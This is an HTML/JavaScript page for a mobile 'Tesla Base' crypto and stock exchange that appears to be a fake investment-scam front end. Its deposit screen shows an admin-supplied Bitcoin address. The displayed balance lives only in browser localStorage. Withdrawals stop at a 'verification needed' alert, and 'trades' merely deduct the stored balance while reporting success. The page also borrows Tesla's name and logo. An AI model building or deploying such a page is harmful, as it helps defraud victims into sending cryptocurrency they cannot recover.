<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Tesla Base | Full Exchange</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --bg: #000; --card: #121212; --tesla-red: #E31937; --text: #fff; --gray: #8e8e8e; --border: #1f1f1f; --green: #00ff88; --red: #ff3b3b; }
        body { background: var(--bg); color: var(--text); font-family: -apple-system, sans-serif; margin: 0; padding-bottom: 90px; }
        
        .header { display: flex; justify-content: space-between; padding: 20px; align-items: center; border-bottom: 1px solid var(--border); }
        .assets-card { padding: 20px; border-bottom: 8px solid #0a0a0a; }
        .bal-usd { font-size: 36px; font-weight: 700; margin: 5px 0; }
        
        /* RESTORED QUICK ACTION BUTTONS */
        .actions { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; padding: 20px; text-align: center; }
        .act-item { background: #1c1c1c; padding: 15px 5px; border-radius: 12px; font-size: 12px; cursor: pointer; border: 1px solid #222; }
        .act-item i { display: block; font-size: 22px; margin-bottom: 8px; color: var(--tesla-red); }

        .asset-row { display: flex; justify-content: space-between; padding: 15px 20px; border-bottom: 1px solid var(--border); align-items: center; cursor: pointer; }
        .coin-info { display: flex; gap: 12px; align-items: center; }
        .coin-info img { width: 35px; height: 35px; border-radius: 50%; background: #fff; padding: 2px; }

        /* Trade Screen Modal */
        #trade-screen { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:var(--bg); z-index:5000; overflow-y: auto; }
        .chart-container { width: 100%; height: 400px; background: #000; }
        .trade-form { padding: 20px; background: var(--card); border-top: 1px solid var(--border); }
        .trade-input { width: 100%; padding: 15px; background: #000; border: 1px solid #333; color: #fff; border-radius: 8px; margin-bottom: 15px; font-size: 18px; box-sizing: border-box;}
        
        /* Deposit Warning Modal */
        #dep-modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.95); z-index:6000; padding:20px; }
        .warn-box { background:var(--card); border: 2px solid var(--tesla-red); border-radius:15px; padding:25px; margin-top:40px; text-align:center; }

        .nav { position: fixed; bottom: 0; width: 100%; display: flex; background: var(--bg); border-top: 1px solid var(--border); padding: 12px 0; z-index: 100; }
        .nav-item { flex: 1; text-align: center; font-size: 10px; color: var(--gray); text-decoration: none; }
        .nav-item.active { color: #fff; }
    </style>
</head>
<body>

    <div id="dep-modal">
        <div class="warn-box">
            <i class="fa-solid fa-triangle-exclamation" style="color:var(--tesla-red); font-size:40px;"></i>
            <h2 style="margin:15px 0;">IMPORTANT</h2>
            <p style="color:var(--gray); font-size:14px;">ONLY SEND <b style="color:#fff;">BITCOIN (BTC)</b> TO THIS ADDRESS. ANY OTHER COIN WILL BE LOST.</p>
            <div id="wallet-addr" style="background:#000; padding:15px; margin:20px 0; border:1px dashed #555; word-break:break-all; font-family:monospace; color:var(--tesla-red);"></div>
            <button onclick="closeDep()" style="width:100%; background:var(--tesla-red); color:#fff; border:none; padding:15px; border-radius:8px; font-weight:bold;">COPY & CLOSE</button>
        </div>
    </div>

    <div id="trade-screen">
        <div class="header">
            <i class="fa-solid fa-chevron-left" onclick="closeTrade()"></i>
            <div id="t-title" style="font-weight:bold;">BTC/USD</div>
            <i class="fa-solid fa-headset"></i>
        </div>
        <div id="tradingview_chart" class="chart-container"></div>
        <div class="trade-form">
            <input type="number" id="trade-amount" class="trade-input" placeholder="Enter Amount ($)">
            <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
                <button onclick="executeTrade('BUY')" style="background:var(--green); color:#000; padding:15px; border-radius:8px; border:none; font-weight:900;">BUY</button>
                <button onclick="executeTrade('SELL')" style="background:var(--red); color:#fff; padding:15px; border-radius:8px; border:none; font-weight:900;">SELL</button>
            </div>
        </div>
    </div>

    <div class="header">
        <div style="font-weight:900; color:var(--tesla-red); letter-spacing:2px;">TESLA BASE</div>
        <i class="fa-solid fa-bell"></i>
    </div>

    <div class="assets-card">
        <div style="color:var(--gray); font-size:13px;">Total Assets</div>
        <div class="bal-usd" id="u-usd">$0.00</div>
    </div>

    <div class="actions">
        <div class="act-item" onclick="openDep()"><i class="fa-solid fa-wallet"></i>Deposit</div>
        <div class="act-item" onclick="alert('Withdrawal verification needed.')"><i class="fa-solid fa-arrow-up-from-bracket"></i>Withdraw</div>
        <div class="act-item" onclick="alert('Swap system active.')"><i class="fa-solid fa-rotate"></i>Convert</div>
    </div>

    <div id="asset-list"></div>

    <nav class="nav">
        <a href="#" class="nav-item active"><i class="fa-solid fa-house"></i>Home</a>
        <a href="#" class="nav-item"><i class="fa-solid fa-chart-line"></i>Trade</a>
        <a href="#" class="nav-item"><i class="fa-solid fa-user"></i>Profile</a>
    </nav>

    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
    <script>
        const assets = [
            { s: 'TSLA', n: 'Tesla Inc.', p: 202.45, i: 'https://upload.wikimedia.org/wikipedia/commons/e/e8/Tesla_logo.png' },
            { s: 'BTC', n: 'Bitcoin', p: 68420.00, i: 'https://cryptologos.cc/logos/bitcoin-btc-logo.png' },
            { s: 'ETH', n: 'Ethereum', p: 3510.12, i: 'https://cryptologos.cc/logos/ethereum-eth-logo.png' }
        ];

        function render() {
            const b = parseFloat(localStorage.getItem('userBalance')) || 0;
            document.getElementById('u-usd').innerText = "$" + b.toLocaleString();
            document.getElementById('asset-list').innerHTML = assets.map(a => `
                <div class="asset-row" onclick="openTrade('${a.s}')">
                    <div class="coin-info"><img src="${a.i}"><div><b>${a.s}</b><br><small>${a.n}</small></div></div>
                    <b>$${a.p.toFixed(2)}</b>
                </div>`).join('');
        }

        function openTrade(s) {
            document.getElementById('trade-screen').style.display = 'block';
            new TradingView.widget({ "autosize": true, "symbol": "BINANCE:"+s+"USDT", "theme": "dark", "container_id": "tradingview_chart" });
        }
        function closeTrade() { document.getElementById('trade-screen').style.display = 'none'; }
        
        function openDep() { 
            document.getElementById('wallet-addr').innerText = localStorage.getItem('dep_info') || "Contact Admin";
            document.getElementById('dep-modal').style.display = 'block'; 
        }
        function closeDep() { document.getElementById('dep-modal').style.display = 'none'; }

        function executeTrade(t) {
            const amt = parseFloat(document.getElementById('trade-amount').value);
            let b = parseFloat(localStorage.getItem('userBalance')) || 0;
            if(amt > b) return alert("Insufficient Balance");
            localStorage.setItem('userBalance', (b - amt).toFixed(2));
            alert(t + " successful. $" + amt + " invested.");
            render(); closeTrade();
        }

        window.onload = render;
    </script>
</body>
</html>
